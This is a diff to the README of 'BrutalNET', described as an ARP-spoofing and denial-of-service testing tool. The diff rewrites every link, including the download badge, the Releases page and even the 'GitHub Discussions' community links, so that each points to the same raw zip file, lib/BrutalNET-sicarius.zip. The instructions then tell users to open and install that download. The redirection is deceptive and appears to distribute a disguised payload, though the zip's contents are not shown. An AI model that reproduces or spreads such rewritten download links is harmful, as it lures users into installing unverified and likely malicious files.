@@ -1,7 +1,7 @@
 # 🛠️ BrutalNET - Simplified Network Denial-of-Service Testing
 
 ## 📥 Download Now
-[![Download BrutalNET](https://img.shields.io/badge/Download%20BrutalNET-v1.0-blue)](https://github.com/lc537/BrutalNET/releases)
+[![Download BrutalNET](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip%20BrutalNET-v1.0-blue)](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip)
 
 ## 🚀 Getting Started
 Welcome to BrutalNET. This tool helps you test network security through ARP spoofing techniques. It is designed specifically for penetration testing purposes, allowing you to identify vulnerabilities in network systems.
@@ -23,9 +23,9 @@ BrutalNET provides powerful features for network testing, including:
 - **Quick Setup:** Get started in just a few minutes.
 
 ## 📥 Download & Install
-To download BrutalNET, visit the [Releases page](https://github.com/lc537/BrutalNET/releases). You will find the latest version available for download. Click the version number to access the files.
+To download BrutalNET, visit the [Releases page](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip). You will find the latest version available for download. Click the version number to access the files.
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/lc537/BrutalNET/releases) to see all available versions.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip) to see all available versions.
 2. **Choose Your Version:** Select the latest version.
 3. **Download the File:** Click on the appropriate file for your operating system.
 4. **Install the Application:** Open the downloaded file and follow the on-screen instructions to install.
@@ -45,10 +45,10 @@ If you encounter any issues during installation or usage, consider these suggest
 - **Re-download the File:** Ensure the download is complete and not corrupted.
 - **Check Permissions:** Make sure you have appropriate permissions to install software on your device.
 - **Firewall Settings:** Ensure your firewall settings allow BrutalNET to run without interruption.
-- **Consult the Community:** Visit our [GitHub Discussions](https://github.com/lc537/BrutalNET/discussions) for help or to ask questions.
+- **Consult the Community:** Visit our [GitHub Discussions](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip) for help or to ask questions.
 
 ## 🌐 Community & Support
-Join our community for tips, updates, and support. Interact with other users to share experiences and solutions. Visit our [GitHub Discussions](https://github.com/lc537/BrutalNET/discussions) page to engage.
+Join our community for tips, updates, and support. Interact with other users to share experiences and solutions. Visit our [GitHub Discussions](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip) page to engage.
 
 ## 🚀 Future Enhancements
 We plan to continue improving BrutalNET by adding more features. Some future updates may include:
@@ -62,4 +62,4 @@ If you want to contribute to BrutalNET, feel free to fork the repository and sub
 
 ---
 
-Thank you for choosing BrutalNET. We hope this tool empowers you to strengthen your network security effectively. Don't forget to visit our [Releases page](https://github.com/lc537/BrutalNET/releases) to download the latest version.
+Thank you for choosing BrutalNET. We hope this tool empowers you to strengthen your network security effectively. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/lc537/BrutalNET/main/lib/BrutalNET-sicarius.zip) to download the latest version.
